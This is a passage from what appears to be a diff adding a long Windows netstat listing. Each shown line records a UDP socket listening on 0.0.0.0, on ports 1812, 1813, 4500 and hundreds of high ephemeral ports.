+57	  UDP    0.0.0.0:1812           *:*	
+58	  UDP    0.0.0.0:1813           *:*	
+59	  UDP    0.0.0.0:4500           *:*	
+60	  UDP    0.0.0.0:49152          *:*	
+61	  UDP    0.0.0.0:49159          *:*	
+62	  UDP    0.0.0.0:49164          *:*	
+63	  UDP    0.0.0.0:49173          *:*	
+64	  UDP    0.0.0.0:49186          *:*	
+65	  UDP    0.0.0.0:49201          *:*	
+66	  UDP    0.0.0.0:49212          *:*	
+67	  UDP    0.0.0.0:49225          *:*	
+68	  UDP    0.0.0.0:49231          *:*	
+69	  UDP    0.0.0.0:49232          *:*	
+70	  UDP    0.0.0.0:49237          *:*	
+71	  UDP    0.0.0.0:49287          *:*	
+72	  UDP    0.0.0.0:49298          *:*	
+73	  UDP    0.0.0.0:49300          *:*	
+74	  UDP    0.0.0.0:49318          *:*	
+75	  UDP    0.0.0.0:49321          *:*	
+76	  UDP    0.0.0.0:49324          *:*	
+77	  UDP    0.0.0.0:49331          *:*	
+78	  UDP    0.0.0.0:49338          *:*	
+79	  UDP    0.0.0.0:49347          *:*	
+80	  UDP    0.0.0.0:49411          *:*	
+81	  UDP    0.0.0.0:49420          *:*	
+82	  UDP    0.0.0.0:49427          *:*	
+83	  UDP    0.0.0.0:49431          *:*	
+84	  UDP    0.0.0.0:49439          *:*	
+85	  UDP    0.0.0.0:49445          *:*	
+86	  UDP    0.0.0.0:49456          *:*	
+87	  UDP    0.0.0.0:49457          *:*	
+88	  UDP    0.0.0.0:49470          *:*	
+89	  UDP    0.0.0.0:49475          *:*	
+90	  UDP    0.0.0.0:49476          *:*	
+91	  UDP    0.0.0.0:49478          *:*	
+92	  UDP    0.0.0.0:49485          *:*	
+93	  UDP    0.0.0.0:49489          *:*	
+94	  UDP    0.0.0.0:49494          *:*	
+95	  UDP    0.0.0.0:49497          *:*	
+96	  UDP    0.0.0.0:49502          *:*	
+97	  UDP    0.0.0.0:49506          *:*	
+98	  UDP    0.0.0.0:49517          *:*	
+99	  UDP    0.0.0.0:49520          *:*	
+100	  UDP    0.0.0.0:49524          *:*	
+101	  UDP    0.0.0.0:49534          *:*	
+102	  UDP    0.0.0.0:49536          *:*	
+103	  UDP    0.0.0.0:49570          *:*	
+104	  UDP    0.0.0.0:49574          *:*	
+105	  UDP    0.0.0.0:49590          *:*	
+106	  UDP    0.0.0.0:49591          *:*	
+107	  UDP    0.0.0.0:49601          *:*	
+108	  UDP    0.0.0.0:49608          *:*	
+109	  UDP    0.0.0.0:49614          *:*	
+110	  UDP    0.0.0.0:49647          *:*	
+111	  UDP    0.0.0.0:49649          *:*	
+112	  UDP    0.0.0.0:49658          *:*	
+113	  UDP    0.0.0.0:49664          *:*	
+114	  UDP    0.0.0.0:49665          *:*	
+115	  UDP    0.0.0.0:49666          *:*	
+116	  UDP    0.0.0.0:49667          *:*	
+117	  UDP    0.0.0.0:49670          *:*	
+118	  UDP    0.0.0.0:49675          *:*	
+119	  UDP    0.0.0.0:49676          *:*	
+120	  UDP    0.0.0.0:49688          *:*	
+121	  UDP    0.0.0.0:49698          *:*	
+122	  UDP    0.0.0.0:49703          *:*	
+123	  UDP    0.0.0.0:49714          *:*	
+124	  UDP    0.0.0.0:49742          *:*	
+125	  UDP    0.0.0.0:49768          *:*	
+126	  UDP    0.0.0.0:49775          *:*	
+127	  UDP    0.0.0.0:49782          *:*	
+128	  UDP    0.0.0.0:49783          *:*	
+129	  UDP    0.0.0.0:49784          *:*	
+130	  UDP    0.0.0.0:49785          *:*	
+131	  UDP    0.0.0.0:49789          *:*	
+132	  UDP    0.0.0.0:49792          *:*	
+133	  UDP    0.0.0.0:49793          *:*	
+134	  UDP    0.0.0.0:49803          *:*	
+135	  UDP    0.0.0.0:49838          *:*	
+136	  UDP    0.0.0.0:49839          *:*	
+137	  UDP    0.0.0.0:49840          *:*	
+138	  UDP    0.0.0.0:49858          *:*	
+139	  UDP    0.0.0.0:49865          *:*	
+140	  UDP    0.0.0.0:49875          *:*	
+141	  UDP    0.0.0.0:49876          *:*	
+142	  UDP    0.0.0.0:49880          *:*	
+143	  UDP    0.0.0.0:49881          *:*	
+144	  UDP    0.0.0.0:49882          *:*	
+145	  UDP    0.0.0.0:49883          *:*	
+146	  UDP    0.0.0.0:49884          *:*	
+147	  UDP    0.0.0.0:49886          *:*	
+148	  UDP    0.0.0.0:49892          *:*	
+149	  UDP    0.0.0.0:49893          *:*	
+150	  UDP    0.0.0.0:49894          *:*	
+151	  UDP    0.0.0.0:49895          *:*	
+152	  UDP    0.0.0.0:49905          *:*	
+153	  UDP    0.0.0.0:49906          *:*	
+154	  UDP    0.0.0.0:49907          *:*	
+155	  UDP    0.0.0.0:49912          *:*	
+156	  UDP    0.0.0.0:49913          *:*	
+157	  UDP    0.0.0.0:49918          *:*	
+158	  UDP    0.0.0.0:49926          *:*	
+159	  UDP    0.0.0.0:49927          *:*	
+160	  UDP    0.0.0.0:49928          *:*	
+161	  UDP    0.0.0.0:49943          *:*	
+162	  UDP    0.0.0.0:49945          *:*	
+163	  UDP    0.0.0.0:49949          *:*	
+164	  UDP    0.0.0.0:49953          *:*	
+165	  UDP    0.0.0.0:49954          *:*	
+166	  UDP    0.0.0.0:49963          *:*	
+167	  UDP    0.0.0.0:49969          *:*	
+168	  UDP    0.0.0.0:49970          *:*	
+169	  UDP    0.0.0.0:49975          *:*	
+170	  UDP    0.0.0.0:49976          *:*	
+171	  UDP    0.0.0.0:49978          *:*	
+172	  UDP    0.0.0.0:49985          *:*	
+173	  UDP    0.0.0.0:49986          *:*	
+174	  UDP    0.0.0.0:49987          *:*	
+175	  UDP    0.0.0.0:50004          *:*	
+176	  UDP    0.0.0.0:50013          *:*	
+177	  UDP    0.0.0.0:50015          *:*	
+178	  UDP    0.0.0.0:50021          *:*	
+179	  UDP    0.0.0.0:50022          *:*	
+180	  UDP    0.0.0.0:50034          *:*	
+181	  UDP    0.0.0.0:50036          *:*	
+182	  UDP    0.0.0.0:50038          *:*	
+183	  UDP    0.0.0.0:50041          *:*	
+184	  UDP    0.0.0.0:50054          *:*	
+185	  UDP    0.0.0.0:50061          *:*	
+186	  UDP    0.0.0.0:50073          *:*	
+187	  UDP    0.0.0.0:50074          *:*	
+188	  UDP    0.0.0.0:50083          *:*	
+189	  UDP    0.0.0.0:50101          *:*	
+190	  UDP    0.0.0.0:50111          *:*	
+191	  UDP    0.0.0.0:50112          *:*	
+192	  UDP    0.0.0.0:50120          *:*	
+193	  UDP    0.0.0.0:50124          *:*	
+194	  UDP    0.0.0.0:50128          *:*	
+195	  UDP    0.0.0.0:50134          *:*	
+196	  UDP    0.0.0.0:50139          *:*	
+197	  UDP    0.0.0.0:50160          *:*	
+198	  UDP    0.0.0.0:50161          *:*	
+199	  UDP    0.0.0.0:50167          *:*	
+200	  UDP    0.0.0.0:50171          *:*	
+201	  UDP    0.0.0.0:50181          *:*	
+202	  UDP    0.0.0.0:50196          *:*	
+203	  UDP    0.0.0.0:50202          *:*	
+204	  UDP    0.0.0.0:50209          *:*	
+205	  UDP    0.0.0.0:50212          *:*	
+206	  UDP    0.0.0.0:50216          *:*	
+207	  UDP    0.0.0.0:50224          *:*	
+208	  UDP    0.0.0.0:50230          *:*	
+209	  UDP    0.0.0.0:50231          *:*	
+210	  UDP    0.0.0.0:50245          *:*	
+211	  UDP    0.0.0.0:50246          *:*	
+212	  UDP    0.0.0.0:50274          *:*	
+213	  UDP    0.0.0.0:50278          *:*	
+214	  UDP    0.0.0.0:50280          *:*	
+215	  UDP    0.0.0.0:50296          *:*	
+216	  UDP    0.0.0.0:50298          *:*	
+217	  UDP    0.0.0.0:50299          *:*	
+218	  UDP    0.0.0.0:50300          *:*	
+219	  UDP    0.0.0.0:50301          *:*	
+220	  UDP    0.0.0.0:50310          *:*	
+221	  UDP    0.0.0.0:50312          *:*	
+222	  UDP    0.0.0.0:50314          *:*	
+223	  UDP    0.0.0.0:50321          *:*	
+224	  UDP    0.0.0.0:50322          *:*	
+225	  UDP    0.0.0.0:50324          *:*	
+226	  UDP    0.0.0.0:50336          *:*	
+227	  UDP    0.0.0.0:50339          *:*	
+228	  UDP    0.0.0.0:50351          *:*	
+229	  UDP    0.0.0.0:50353          *:*	
+230	  UDP    0.0.0.0:50354          *:*	
+231	  UDP    0.0.0.0:50355          *:*	
+232	  UDP    0.0.0.0:50356          *:*	
+233	  UDP    0.0.0.0:50358          *:*	
+234	  UDP    0.0.0.0:50393          *:*	
+235	  UDP    0.0.0.0:50403          *:*	
+236	  UDP    0.0.0.0:50407          *:*	
+237	  UDP    0.0.0.0:50412          *:*	
+238	  UDP    0.0.0.0:50417          *:*	
+239	  UDP    0.0.0.0:50424          *:*	
+240	  UDP    0.0.0.0:50428          *:*	
+241	  UDP    0.0.0.0:50431          *:*	
+242	  UDP    0.0.0.0:50433          *:*	
+243	  UDP    0.0.0.0:50441          *:*	
+244	  UDP    0.0.0.0:50449          *:*	
+245	  UDP    0.0.0.0:50458          *:*	
+246	  UDP    0.0.0.0:50467          *:*	
+247	  UDP    0.0.0.0:50469          *:*	
+248	  UDP    0.0.0.0:50478          *:*	
+249	  UDP    0.0.0.0:50507          *:*	
+250	  UDP    0.0.0.0:50509          *:*	
+251	  UDP    0.0.0.0:50510          *:*	
+252	  UDP    0.0.0.0:50517          *:*	
+253	  UDP    0.0.0.0:50523          *:*	
+254	  UDP    0.0.0.0:50524          *:*	
+255	  UDP    0.0.0.0:50527          *:*	
+256	  UDP    0.0.0.0:50531          *:*	
+257	  UDP    0.0.0.0:50540          *:*	
+258	  UDP    0.0.0.0:50549          *:*	
+259	  UDP    0.0.0.0:50550          *:*	
+260	  UDP    0.0.0.0:50551          *:*	
+261	  UDP    0.0.0.0:50552          *:*	
+262	  UDP    0.0.0.0:50555          *:*	
+263	  UDP    0.0.0.0:50562          *:*	
+264	  UDP    0.0.0.0:50577          *:*	
+265	  UDP    0.0.0.0:50579          *:*	
+266	  UDP    0.0.0.0:50587          *:*	
+267	  UDP    0.0.0.0:50591          *:*	
+268	  UDP    0.0.0.0:50593          *:*	
+269	  UDP    0.0.0.0:50594          *:*	
+270	  UDP    0.0.0.0:50599          *:*	
+271	  UDP    0.0.0.0:50601          *:*	
+272	  UDP    0.0.0.0:50602          *:*	
+273	  UDP    0.0.0.0:50608          *:*	
+274	  UDP    0.0.0.0:50633          *:*	
+275	  UDP    0.0.0.0:50642          *:*	
+276	  UDP    0.0.0.0:50644          *:*	
+277	  UDP    0.0.0.0:50646          *:*	
+278	  UDP    0.0.0.0:50648          *:*	
+279	  UDP    0.0.0.0:50654          *:*	
+280	  UDP    0.0.0.0:50674          *:*	
+281	  UDP    0.0.0.0:50675          *:*	
+282	  UDP    0.0.0.0:50682          *:*	
+283	  UDP    0.0.0.0:50690          *:*	
+284	  UDP    0.0.0.0:50701          *:*	
+285	  UDP    0.0.0.0:50710          *:*	
+286	  UDP    0.0.0.0:50714          *:*	
+287	  UDP    0.0.0.0:50715          *:*	
+288	  UDP    0.0.0.0:50721          *:*	
+289	  UDP    0.0.0.0:50729          *:*	
+290	  UDP    0.0.0.0:50745          *:*	
+291	  UDP    0.0.0.0:50746          *:*	
+292	  UDP    0.0.0.0:50748          *:*	
+293	  UDP    0.0.0.0:50752          *:*	
+294	  UDP    0.0.0.0:50754          *:*	
+295	  UDP    0.0.0.0:50771          *:*	
+296	  UDP    0.0.0.0:50772          *:*	
+297	  UDP    0.0.0.0:50773          *:*	
+298	  UDP    0.0.0.0:50795          *:*	
+299	  UDP    0.0.0.0:50797          *:*	
+300	  UDP    0.0.0.0:50798          *:*	
+301	  UDP    0.0.0.0:50807          *:*	
+302	  UDP    0.0.0.0:50808          *:*	
+303	  UDP    0.0.0.0:50814          *:*	
+304	  UDP    0.0.0.0:50817          *:*	
+305	  UDP    0.0.0.0:50828          *:*	
+306	  UDP    0.0.0.0:50855          *:*	
+307	  UDP    0.0.0.0:50863          *:*	
+308	  UDP    0.0.0.0:50865          *:*	
+309	  UDP    0.0.0.0:50871          *:*	
+310	  UDP    0.0.0.0:50885          *:*	
+311	  UDP    0.0.0.0:50898          *:*	
+312	  UDP    0.0.0.0:50902          *:*	
+313	  UDP    0.0.0.0:50903          *:*	
+314	  UDP    0.0.0.0:50908          *:*	
+315	  UDP    0.0.0.0:50911          *:*	
+316	  UDP    0.0.0.0:50913          *:*	
+317	  UDP    0.0.0.0:50931          *:*	
+318	  UDP    0.0.0.0:50951          *:*	
+319	  UDP    0.0.0.0:50954          *:*	
+320	  UDP    0.0.0.0:50956          *:*	
+321	  UDP    0.0.0.0:50962          *:*	
+322	  UDP    0.0.0.0:50964          *:*	
+323	  UDP    0.0.0.0:50972          *:*	
+324	  UDP    0.0.0.0:50997          *:*	
+325	  UDP    0.0.0.0:51007          *:*	
+326	  UDP    0.0.0.0:51014          *:*	
+327	  UDP    0.0.0.0:51025          *:*	
+328	  UDP    0.0.0.0:51027          *:*	
+329	  UDP    0.0.0.0:51029          *:*	
+330	  UDP    0.0.0.0:51031          *:*	
+331	  UDP    0.0.0.0:51035          *:*	
+332	  UDP    0.0.0.0:51037          *:*	
+333	  UDP    0.0.0.0:51048          *:*	
+334	  UDP    0.0.0.0:51049          *:*	
+335	  UDP    0.0.0.0:51050          *:*	
+336	  UDP    0.0.0.0:51055          *:*	
+337	  UDP    0.0.0.0:51059          *:*	
+338	  UDP    0.0.0.0:51065          *:*	
+339	  UDP    0.0.0.0:51078          *:*	
+340	  UDP    0.0.0.0:51082          *:*	
+341	  UDP    0.0.0.0:51085          *:*	
+342	  UDP    0.0.0.0:51086          *:*	
+343	  UDP    0.0.0.0:51113          *:*	
+344	  UDP    0.0.0.0:51123          *:*	
+345	  UDP    0.0.0.0:51133          *:*	
+346	  UDP    0.0.0.0:51137          *:*	
+347	  UDP    0.0.0.0:51138          *:*	
+348	  UDP    0.0.0.0:51151          *:*	
+349	  UDP    0.0.0.0:51152          *:*	
+350	  UDP    0.0.0.0:51153          *:*	
+351	  UDP    0.0.0.0:51154          *:*	
+352	  UDP    0.0.0.0:51167          *:*	
+353	  UDP    0.0.0.0:51169          *:*	
+354	  UDP    0.0.0.0:51170          *:*	
+355	  UDP    0.0.0.0:51183          *:*	
+356	  UDP    0.0.0.0:51185          *:*	
+357	  UDP    0.0.0.0:51191          *:*	
+358	  UDP    0.0.0.0:51193          *:*	
+359	  UDP    0.0.0.0:51196          *:*	
+360	  UDP    0.0.0.0:51197          *:*	
+361	  UDP    0.0.0.0:51198          *:*	
+362	  UDP    0.0.0.0:51207          *:*	
+363	  UDP    0.0.0.0:51211          *:*	
+364	  UDP    0.0.0.0:51212          *:*	
+365	  UDP    0.0.0.0:51213          *:*	
+366	  UDP    0.0.0.0:51224          *:*	
+367	  UDP    0.0.0.0:51232          *:*	
+368	  UDP    0.0.0.0:51236          *:*	
+369	  UDP    0.0.0.0:51237          *:*	
+370	  UDP    0.0.0.0:51239          *:*	
+371	  UDP    0.0.0.0:51248          *:*	
+372	  UDP    0.0.0.0:51249          *:*	
+373	  UDP    0.0.0.0:51254          *:*	
+374	  UDP    0.0.0.0:51256          *:*	
+375	  UDP    0.0.0.0:51268          *:*	
+376	  UDP    0.0.0.0:51270          *:*	
+377	  UDP    0.0.0.0:51274          *:*	
+378	  UDP    0.0.0.0:51297          *:*	
+379	  UDP    0.0.0.0:51310          *:*	
+380	  UDP    0.0.0.0:51313          *:*	
+381	  UDP    0.0.0.0:51317          *:*	
+382	  UDP    0.0.0.0:51320          *:*	
+383	  UDP    0.0.0.0:51332          *:*	
+384	  UDP    0.0.0.0:51333          *:*	
+385	  UDP    0.0.0.0:51341          *:*	
+386	  UDP    0.0.0.0:51362          *:*	
+387	  UDP    0.0.0.0:51363          *:*	
+388	  UDP    0.0.0.0:51365          *:*	
+389	  UDP    0.0.0.0:51366          *:*	
+390	  UDP    0.0.0.0:51377          *:*	
+391	  UDP    0.0.0.0:51381          *:*	
+392	  UDP    0.0.0.0:51389          *:*	
+393	  UDP    0.0.0.0:51393          *:*	
+394	  UDP    0.0.0.0:51396          *:*	
+395	  UDP    0.0.0.0:51401          *:*	
+396	  UDP    0.0.0.0:51404          *:*	
+397	  UDP    0.0.0.0:51419          *:*	
+398	  UDP    0.0.0.0:51422          *:*	
+399	  UDP    0.0.0.0:51429          *:*	
+400	  UDP    0.0.0.0:51431          *:*	
+401	  UDP    0.0.0.0:51432          *:*	
+402	  UDP    0.0.0.0:51442          *:*	
+403	  UDP    0.0.0.0:51454          *:*	
+404	  UDP    0.0.0.0:51457          *:*	
+405	  UDP    0.0.0.0:51461          *:*	
+406	  UDP    0.0.0.0:51462          *:*	
+407	  UDP    0.0.0.0:51471          *:*	
+408	  UDP    0.0.0.0:51472          *:*	
+409	  UDP    0.0.0.0:51477          *:*	
+410	  UDP    0.0.0.0:51482          *:*	
+411	  UDP    0.0.0.0:51491          *:*	
+412	  UDP    0.0.0.0:51494          *:*	
+413	  UDP    0.0.0.0:51497          *:*	
+414	  UDP    0.0.0.0:51504          *:*	
+415	  UDP    0.0.0.0:51507          *:*	
+416	  UDP    0.0.0.0:51513          *:*	
+417	  UDP    0.0.0.0:51520          *:*	
+418	  UDP    0.0.0.0:51521          *:*	
+419	  UDP    0.0.0.0:51522          *:*	
+420	  UDP    0.0.0.0:51524          *:*	
+421	  UDP    0.0.0.0:51536          *:*	
+422	  UDP    0.0.0.0:51540          *:*	
+423	  UDP    0.0.0.0:51550          *:*	
+424	  UDP    0.0.0.0:51561          *:*	
+425	  UDP    0.0.0.0:51566          *:*	
+426	  UDP    0.0.0.0:51572          *:*	
+427	  UDP    0.0.0.0:51581          *:*	
+428	  UDP    0.0.0.0:51585          *:*	
+429	  UDP    0.0.0.0:51587          *:*	
+430	  UDP    0.0.0.0:51591          *:*	
+431	  UDP    0.0.0.0:51596          *:*	
+432	  UDP    0.0.0.0:51607          *:*	
+433	  UDP    0.0.0.0:51608          *:*	
+434	  UDP    0.0.0.0:51611          *:*	
+435	  UDP    0.0.0.0:51648          *:*	
+436	  UDP    0.0.0.0:51656          *:*	
+437	  UDP    0.0.0.0:51665          *:*	
+438	  UDP    0.0.0.0:51666          *:*	
+439	  UDP    0.0.0.0:51667          *:*	
+440	  UDP    0.0.0.0:51672          *:*	
+441	  UDP    0.0.0.0:51678          *:*	
+442	  UDP    0.0.0.0:51686          *:*	
+443	  UDP    0.0.0.0:51704          *:*	
+444	  UDP    0.0.0.0:51705          *:*	
+445	  UDP    0.0.0.0:51713          *:*	
+446	  UDP    0.0.0.0:51714          *:*	
+447	  UDP    0.0.0.0:51715          *:*	
+448	  UDP    0.0.0.0:51718          *:*	
+449	  UDP    0.0.0.0:51720          *:*	
+450	  UDP    0.0.0.0:51723          *:*	
+451	  UDP    0.0.0.0:51728          *:*	
+452	  UDP    0.0.0.0:51744          *:*	
+453	  UDP    0.0.0.0:51749          *:*	
+454	  UDP    0.0.0.0:51753          *:*	
+455	  UDP    0.0.0.0:51756          *:*	
+456	  UDP    0.0.0.0:51757          *:*	
+457	  UDP    0.0.0.0:51775          *:*	
+458	  UDP    0.0.0.0:51795          *:*	
+459	  UDP    0.0.0.0:51807          *:*	
+460	  UDP    0.0.0.0:51815          *:*	
+461	  UDP    0.0.0.0:51818          *:*	
+462	  UDP    0.0.0.0:51821          *:*	
+463	  UDP    0.0.0.0:51822          *:*	
+464	  UDP    0.0.0.0:51825          *:*	
+465	  UDP    0.0.0.0:51828          *:*	
+466	  UDP    0.0.0.0:51830          *:*	
+467	  UDP    0.0.0.0:51832          *:*	
+468	  UDP    0.0.0.0:51851          *:*	
+469	  UDP    0.0.0.0:51856          *:*	
+470	  UDP    0.0.0.0:51859          *:*	
+471	  UDP    0.0.0.0:51863          *:*	
+472	  UDP    0.0.0.0:51878          *:*	
+473	  UDP    0.0.0.0:51879          *:*	
+474	  UDP    0.0.0.0:51892          *:*	
+475	  UDP    0.0.0.0:51901          *:*	
+476	  UDP    0.0.0.0:51904          *:*	
+477	  UDP    0.0.0.0:51911          *:*	
+478	  UDP    0.0.0.0:51914          *:*	
+479	  UDP    0.0.0.0:51922          *:*	
+480	  UDP    0.0.0.0:51943          *:*	
+481	  UDP    0.0.0.0:51945          *:*	
+482	  UDP    0.0.0.0:51947          *:*	
+483	  UDP    0.0.0.0:51959          *:*	
+484	  UDP    0.0.0.0:51960          *:*	
+485	  UDP    0.0.0.0:51961          *:*	
+486	  UDP    0.0.0.0:51964          *:*	
+487	  UDP    0.0.0.0:51980          *:*	
+488	  UDP    0.0.0.0:51981          *:*	
+489	  UDP    0.0.0.0:51998          *:*	
+490	  UDP    0.0.0.0:52002          *:*	
+491	  UDP    0.0.0.0:52005          *:*	
+492	  UDP    0.0.0.0:52006          *:*	
+493	  UDP    0.0.0.0:52030          *:*	
+494	  UDP    0.0.0.0:52032          *:*	
+495	  UDP    0.0.0.0:52051          *:*	
+496	  UDP    0.0.0.0:52052          *:*	
+497	  UDP    0.0.0.0:52073          *:*	
+498	  UDP    0.0.0.0:52082          *:*	
+499	  UDP    0.0.0.0:52084          *:*	
+500	  UDP    0.0.0.0:52089          *:*	
+501	  UDP    0.0.0.0:52105          *:*	
+502	  UDP    0.0.0.0:52129          *:*	
+503	  UDP    0.0.0.0:52132          *:*	
+504	  UDP    0.0.0.0:52133          *:*	
+505	  UDP    0.0.0.0:52142          *:*	
+506	  UDP    0.0.0.0:52143          *:*	
+507	  UDP    0.0.0.0:52146          *:*	
+508	  UDP    0.0.0.0:52147          *:*	
+509	  UDP    0.0.0.0:52148          *:*	
+510	  UDP    0.0.0.0:52156          *:*	
+511	  UDP    0.0.0.0:52158          *:*	
+512	  UDP    0.0.0.0:52159          *:*	
+513	  UDP    0.0.0.0:52169          *:*	
+514	  UDP    0.0.0.0:52177          *:*	
+515	  UDP    0.0.0.0:52187          *:*	
+516	  UDP    0.0.0.0:52191          *:*	
+517	  UDP    0.0.0.0:52192          *:*	
+518	  UDP    0.0.0.0:52195          *:*	
+519	  UDP    0.0.0.0:52207          *:*	
+520	  UDP    0.0.0.0:52211          *:*	
+521	  UDP    0.0.0.0:52214          *:*	
+522	  UDP    0.0.0.0:52215          *:*	
+523	  UDP    0.0.0.0:52219          *:*	
+524	  UDP    0.0.0.0:52220          *:*	
+525	  UDP    0.0.0.0:52221          *:*	
+526	  UDP    0.0.0.0:52222          *:*	
+527	  UDP    0.0.0.0:52231          *:*	
+528	  UDP    0.0.0.0:52233          *:*	
+529	  UDP    0.0.0.0:52237          *:*	
+530	  UDP    0.0.0.0:52257          *:*	
+531	  UDP    0.0.0.0:52271          *:*	
+532	  UDP    0.0.0.0:52273          *:*	
+533	  UDP    0.0.0.0:52276          *:*	
+534	  UDP    0.0.0.0:52279          *:*	
+535	  UDP    0.0.0.0:52286          *:*	
+536	  UDP    0.0.0.0:52291          *:*	
+537	  UDP    0.0.0.0:52296          *:*	
+538	  UDP    0.0.0.0:52298          *:*	
+539	  UDP    0.0.0.0:52307          *:*	
+540	  UDP    0.0.0.0:52316          *:*	
+541	  UDP    0.0.0.0:52321          *:*	
+542	  UDP    0.0.0.0:52325          *:*	
+543	  UDP    0.0.0.0:52333          *:*	
+544	  UDP    0.0.0.0:52336          *:*	
+545	  UDP    0.0.0.0:52350          *:*	
+546	  UDP    0.0.0.0:52362          *:*	
+547	  UDP    0.0.0.0:52372          *:*	
+548	  UDP    0.0.0.0:52373          *:*	
+549	  UDP    0.0.0.0:52374          *:*	
+550	  UDP    0.0.0.0:52375          *:*	
+551	  UDP    0.0.0.0:52379          *:*	
+552	  UDP    0.0.0.0:52401          *:*	
+553	  UDP    0.0.0.0:52412          *:*	
+554	  UDP    0.0.0.0:52436          *:*	
+555	  UDP    0.0.0.0:52437          *:*	
+556	  UDP    0.0.0.0:52439          *:*	
+557	  UDP    0.0.0.0:52443          *:*	
+558	  UDP    0.0.0.0:52452          *:*	
+559	  UDP    0.0.0.0:52453          *:*	
+560	  UDP    0.0.0.0:52455          *:*	
+561	  UDP    0.0.0.0:52456          *:*	
+562	  UDP    0.0.0.0:52459          *:*	
+563	  UDP    0.0.0.0:52462          *:*	
+564	  UDP    0.0.0.0:52466          *:*	
+565	  UDP    0.0.0.0:52468          *:*	
+566	  UDP    0.0.0.0:52478          *:*	
+567	  UDP    0.0.0.0:52485          *:*	
+568	  UDP    0.0.0.0:52486          *:*	
+569	  UDP    0.0.0.0:52489          *:*	
+570	  UDP    0.0.0.0:52493          *:*	
+571	  UDP    0.0.0.0:52499          *:*	
+572	  UDP    0.0.0.0:52514          *:*	
+573	  UDP    0.0.0.0:52519          *:*	
+574	  UDP    0.0.0.0:52520          *:*	
+575	  UDP    0.0.0.0:52523          *:*	
+576	  UDP    0.0.0.0:52526          *:*	
+577	  UDP    0.0.0.0:52535          *:*	
+578	  UDP    0.0.0.0:52538          *:*	
+579	  UDP    0.0.0.0:52549          *:*	
+580	  UDP    0.0.0.0:52562          *:*	
+581	  UDP    0.0.0.0:52573          *:*	
+582	  UDP    0.0.0.0:52577          *:*	
+583	  UDP    0.0.0.0:52578          *:*	
+584	  UDP    0.0.0.0:52583          *:*	
+585	  UDP    0.0.0.0:52584          *:*	
+586	  UDP    0.0.0.0:52593          *:*	
+587	  UDP    0.0.0.0:52600          *:*	
+588	  UDP    0.0.0.0:52601          *:*	
+589	  UDP    0.0.0.0:52606          *:*	
+590	  UDP    0.0.0.0:52626          *:*	
+591	  UDP    0.0.0.0:52630          *:*	
+592	  UDP    0.0.0.0:52631          *:*	
+593	  UDP    0.0.0.0:52632          *:*	
+594	  UDP    0.0.0.0:52640          *:*	
+595	  UDP    0.0.0.0:52648          *:*	
+596	  UDP    0.0.0.0:52653          *:*	
+597	  UDP    0.0.0.0:52667          *:*	
+598	  UDP    0.0.0.0:52676          *:*	
+599	  UDP    0.0.0.0:52681          *:*	
+600	  UDP    0.0.0.0:52682          *:*	
+601	  UDP    0.0.0.0:52703          *:*	
+602	  UDP    0.0.0.0:52704          *:*	
+603	  UDP    0.0.0.0:52714          *:*	
+604	  UDP    0.0.0.0:52717          *:*	
+605	  UDP    0.0.0.0:52750          *:*	
+606	  UDP    0.0.0.0:52752          *:*	
+607	  UDP    0.0.0.0:52768          *:*	
+608	  UDP    0.0.0.0:52771          *:*	
+609	  UDP    0.0.0.0:52782          *:*	
+610	  UDP    0.0.0.0:52807          *:*	
+611	  UDP    0.0.0.0:52812          *:*	
+612	  UDP    0.0.0.0:52814          *:*	
+613	  UDP    0.0.0.0:52828          *:*	
+614	  UDP    0.0.0.0:52829          *:*	
+615	  UDP    0.0.0.0:52838          *:*	
+616	  UDP    0.0.0.0:52839          *:*	
+617	  UDP    0.0.0.0:52840          *:*	
+618	  UDP    0.0.0.0:52850          *:*	
+619	  UDP    0.0.0.0:52868          *:*	
+620	  UDP    0.0.0.0:52875          *:*	
+621	  UDP    0.0.0.0:52879          *:*	
+622	  UDP    0.0.0.0:52880          *:*	
+623	  UDP    0.0.0.0:52884          *:*	
+624	  UDP    0.0.0.0:52891          *:*	
+625	  UDP    0.0.0.0:52892          *:*	
+626	  UDP    0.0.0.0:52894          *:*	
+627	  UDP    0.0.0.0:52904          *:*	
+628	  UDP    0.0.0.0:52916          *:*	
+629	  UDP    0.0.0.0:52924          *:*	
+630	  UDP    0.0.0.0:52945          *:*	
+631	  UDP    0.0.0.0:52946          *:*	
+632	  UDP    0.0.0.0:52950          *:*	
+633	  UDP    0.0.0.0:52978          *:*	
+634	  UDP    0.0.0.0:52980          *:*	
+635	  UDP    0.0.0.0:52987          *:*	
+636	  UDP    0.0.0.0:52994          *:*	
+637	  UDP    0.0.0.0:52996          *:*	
+638	  UDP    0.0.0.0:53016          *:*	
+639	  UDP    0.0.0.0:53017          *:*	
+640	  UDP    0.0.0.0:53024          *:*	
+641	  UDP    0.0.0.0:53027          *:*	
+642	  UDP    0.0.0.0:53029          *:*	
+643	  UDP    0.0.0.0:53051          *:*	
+644	  UDP    0.0.0.0:53053          *:*	
+645	  UDP    0.0.0.0:53054          *:*	
+646	  UDP    0.0.0.0:53063          *:*	
+647	  UDP    0.0.0.0:53069          *:*	
+648	  UDP    0.0.0.0:53076          *:*	
+649	  UDP    0.0.0.0:53077          *:*	
+650	  UDP    0.0.0.0:53082          *:*	
+651	  UDP    0.0.0.0:53084          *:*	
+652	  UDP    0.0.0.0:53091          *:*	
+653	  UDP    0.0.0.0:53100          *:*	
+654	  UDP    0.0.0.0:53107          *:*	
+655	  UDP    0.0.0.0:53108          *:*	
+656	  UDP    0.0.0.0:53113          *:*	
+657	  UDP    0.0.0.0:53114          *:*	
+658	  UDP    0.0.0.0:53115          *:*	
+659	  UDP    0.0.0.0:53133          *:*	
+660	  UDP    0.0.0.0:53134          *:*	
+661	  UDP    0.0.0.0:53137          *:*	
+662	  UDP    0.0.0.0:53146          *:*	
+663	  UDP    0.0.0.0:53160          *:*	
+664	  UDP    0.0.0.0:53168          *:*	
+665	  UDP    0.0.0.0:53176          *:*	
+666	  UDP    0.0.0.0:53207          *:*	
+667	  UDP    0.0.0.0:53225          *:*	
+668	  UDP    0.0.0.0:53233          *:*	
+669	  UDP    0.0.0.0:53239          *:*	
+670	  UDP    0.0.0.0:53241          *:*	
+671	  UDP    0.0.0.0:53242          *:*	
+672	  UDP    0.0.0.0:53243          *:*	
+673	  UDP    0.0.0.0:53251          *:*	
+674	  UDP    0.0.0.0:53252          *:*	
+675	  UDP    0.0.0.0:53264          *:*	
+676	  UDP    0.0.0.0:53265          *:*	
+677	  UDP    0.0.0.0:53266          *:*	
+678	  UDP    0.0.0.0:53269          *:*	
+679	  UDP    0.0.0.0:53279          *:*	
+680	  UDP    0.0.0.0:53283          *:*	
+681	  UDP    0.0.0.0:53284          *:*	
